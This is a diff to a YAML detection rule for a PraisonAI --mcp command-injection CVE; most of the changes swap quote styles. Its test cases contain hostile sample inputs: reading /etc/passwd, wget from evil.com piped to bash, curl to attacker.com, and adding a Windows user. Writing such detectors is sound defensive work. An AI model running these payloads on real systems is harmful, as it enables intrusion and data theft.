@@ -1,4 +1,4 @@
-title: "PraisonAI parse_mcp_command() CLI Argument Command Injection (CVE-2026-34935)"
+title: 'PraisonAI parse_mcp_command() CLI Argument Command Injection (CVE-2026-34935)'
 id: ATR-2026-00540
 rule_version: 1
 status: draft
@@ -20,26 +20,26 @@ description: >
 
   Complements ATR-2026-00531 (PraisonAI HTTP API auth bypass) and
   ATR-2026-00528 (PraisonAI AUTH_ENABLED hardcoded default).
-author: "ATR Community"
-date: "2026/05/28"
-schema_version: "0.1"
+author: 'ATR Community'
+date: '2026/05/28'
+schema_version: '0.1'
 detection_tier: pattern
 maturity: draft
 severity: critical
 
 references:
   owasp_llm:
-    - "LLM05:2025 - Improper Output Handling"
+    - 'LLM05:2025 - Improper Output Handling'
   owasp_agentic:
-    - "ASI05:2026 - Unexpected Code Execution"
+    - 'ASI05:2026 - Unexpected Code Execution'
   mitre_atlas:
-    - "AML.T0049 - Exploit Public-Facing Application"
-    - "AML.T0040 - ML Model Inference API Access"
+    - 'AML.T0049 - Exploit Public-Facing Application'
+    - 'AML.T0040 - ML Model Inference API Access'
   mitre_attack:
-    - "T1059 - Command and Scripting Interpreter"
-    - "T1190 - Exploit Public-Facing Application"
+    - 'T1059 - Command and Scripting Interpreter'
+    - 'T1190 - Exploit Public-Facing Application'
   cve:
-    - "CVE-2026-34935"
+    - 'CVE-2026-34935'
 
 metadata_provenance:
   mitre_atlas: human-reviewed
@@ -48,37 +48,37 @@ metadata_provenance:
 
 compliance:
   eu_ai_act:
-    - article: "15"
+    - article: '15'
       context: >
         CVE-2026-34935 passes the --mcp CLI argument without sanitization into
         anyio.open_process(); Article 15 cybersecurity requirements mandate that
         AI agent CLI interfaces validate user-controlled parameters before any
         subprocess execution.
       strength: primary
-    - article: "9"
-      context: "Article 9 (risk management system) requires identified risks to be addressed by appropriate measures; this rule is a runtime risk-treatment control that detects the tool-poisoning technique (PraisonAI parse_mcp_command() CLI Argument Command Injection (CVE-2026-34935))."
+    - article: '9'
+      context: 'Article 9 (risk management system) requires identified risks to be addressed by appropriate measures; this rule is a runtime risk-treatment control that detects the tool-poisoning technique (PraisonAI parse_mcp_command() CLI Argument Command Injection (CVE-2026-34935)).'
       strength: secondary
   nist_ai_rmf:
-    - subcategory: "MP.5.1"
+    - subcategory: 'MP.5.1'
       context: >
         Attacker-controlled --mcp values reaching anyio.open_process() constitute
         an adversarial input attack; MP.5.1 requires scanning MCP CLI arguments
         for inline-exec flags and shell metacharacters.
       strength: primary
-    - subcategory: "MS.2.7"
+    - subcategory: 'MS.2.7'
       context: "NIST AI RMF MEASURE 2.7 (security and resilience evaluated and documented) is supported by this rule's runtime detection of the tool-poisoning technique (PraisonAI parse_mcp_command() CLI Argument Command Injection (CVE-2026-34935))."
       strength: primary
-    - subcategory: "MG.3.2"
-      context: "NIST AI RMF MANAGE 3.2 (pre-trained models monitored as part of maintenance) is supported where this rule detects the tool-poisoning technique (PraisonAI parse_mcp_command() CLI Argument Command Injection (CVE-2026-34935))."
+    - subcategory: 'MG.3.2'
+      context: 'NIST AI RMF MANAGE 3.2 (pre-trained models monitored as part of maintenance) is supported where this rule detects the tool-poisoning technique (PraisonAI parse_mcp_command() CLI Argument Command Injection (CVE-2026-34935)).'
       strength: secondary
   iso_42001:
-    - clause: "8.1"
+    - clause: '8.1'
       context: >
         Operational controls must detect and block PraisonAI --mcp arguments
         containing shell interpreter inline-exec primitives before process launch.
       strength: primary
-    - clause: "8.3"
-      context: "ISO/IEC 42001 Clause 8.3 (AI risk treatment) is supported by this rule, which implements runtime detection of the tool-poisoning technique (PraisonAI parse_mcp_command() CLI Argument Command Injection (CVE-2026-34935)) as a treatment control."
+    - clause: '8.3'
+      context: 'ISO/IEC 42001 Clause 8.3 (AI risk treatment) is supported by this rule, which implements runtime detection of the tool-poisoning technique (PraisonAI parse_mcp_command() CLI Argument Command Injection (CVE-2026-34935)) as a treatment control.'
       strength: secondary
 
 tags:
@@ -100,9 +100,9 @@ agent_source:
 detection:
   condition: any
   false_positives:
-    - "Legitimate praisonai --mcp usage with npx/uvx/python -m module paths — pattern requires -c/-e inline-exec flags."
-    - "Security advisory text quoting CVE-2026-34935 PoC payloads for documentation."
-    - "Automated MCP server startup scripts using safe invocation patterns (no -c or shell metacharacters)."
+    - 'Legitimate praisonai --mcp usage with npx/uvx/python -m module paths — pattern requires -c/-e inline-exec flags.'
+    - 'Security advisory text quoting CVE-2026-34935 PoC payloads for documentation.'
+    - 'Automated MCP server startup scripts using safe invocation patterns (no -c or shell metacharacters).'
   conditions:
     - field: content
       operator: regex
@@ -150,44 +150,44 @@ wild_fp_rate: 0
 
 test_cases:
   true_positives:
-    - input: "--mcp \"bash -c 'cat /etc/passwd'\""
+    - input: '--mcp "bash -c ''cat /etc/passwd''"'
       expected: triggered
-      description: "Direct CVE-2026-34935 PoC: bash -c with shell payload"
+      description: 'Direct CVE-2026-34935 PoC: bash -c with shell payload'
     - input: "--mcp 'python -c \"import os; os.system(\\\"id\\\")\"'"
       expected: triggered
-      description: "python -c with os.system() inline RCE"
+      description: 'python -c with os.system() inline RCE'
     - input: "--mcp 'sh -c wget evil.com/shell.sh | bash'"
       expected: triggered
-      description: "sh -c with wget download-and-exec chain"
-    - input: "--mcp 'node -e require(\"child_process\").execSync(\"whoami\")'"
+      description: 'sh -c with wget download-and-exec chain'
+    - input: '--mcp ''node -e require("child_process").execSync("whoami")'''
       expected: triggered
-      description: "node -e JavaScript inline exec"
-    - input: "--mcp 'perl -e system(\"mkdir /tmp/pwned\")'"
+      description: 'node -e JavaScript inline exec'
+    - input: '--mcp ''perl -e system("mkdir /tmp/pwned")'''
       expected: triggered
-      description: "perl -e system() one-liner"
+      description: 'perl -e system() one-liner'
     - input: "--mcp 'bash -c evil && curl http://attacker.com/keys'"
       expected: triggered
-      description: "--mcp with && command chaining"
+      description: '--mcp with && command chaining'
     - input: "--mcp 'cmd.exe -c net user hacker P@ss /add'"
       expected: triggered
-      description: "Windows cmd.exe -c in --mcp argument"
+      description: 'Windows cmd.exe -c in --mcp argument'
 
   true_negatives:
     - input: "--mcp 'npx @modelcontextprotocol/server-filesystem /data'"
       expected: not_triggered
-      description: "Legitimate npx MCP server — no -c flag, no metacharacters"
+      description: 'Legitimate npx MCP server — no -c flag, no metacharacters'
     - input: "--mcp 'python -m mcp_server_weather --port 8080'"
       expected: not_triggered
-      description: "python -m module invocation — not -c inline-exec"
+      description: 'python -m module invocation — not -c inline-exec'
     - input: "--mcp 'uvx ruff-mcp'"
       expected: not_triggered
-      description: "uvx launcher — safe pattern"
+      description: 'uvx launcher — safe pattern'
     - input: "--mcp 'node /usr/local/lib/mcp-server.js'"
       expected: not_triggered
-      description: "node running a file — not -e inline-exec"
-    - input: "Upgrade PraisonAI to fix CVE-2026-34935"
+      description: 'node running a file — not -e inline-exec'
+    - input: 'Upgrade PraisonAI to fix CVE-2026-34935'
       expected: not_triggered
-      description: "Mitigation advisory without exploit content"
+      description: 'Mitigation advisory without exploit content'
 
 evasion_tests:
   - input: "--mcp '/usr/bin/env bash -c id'"
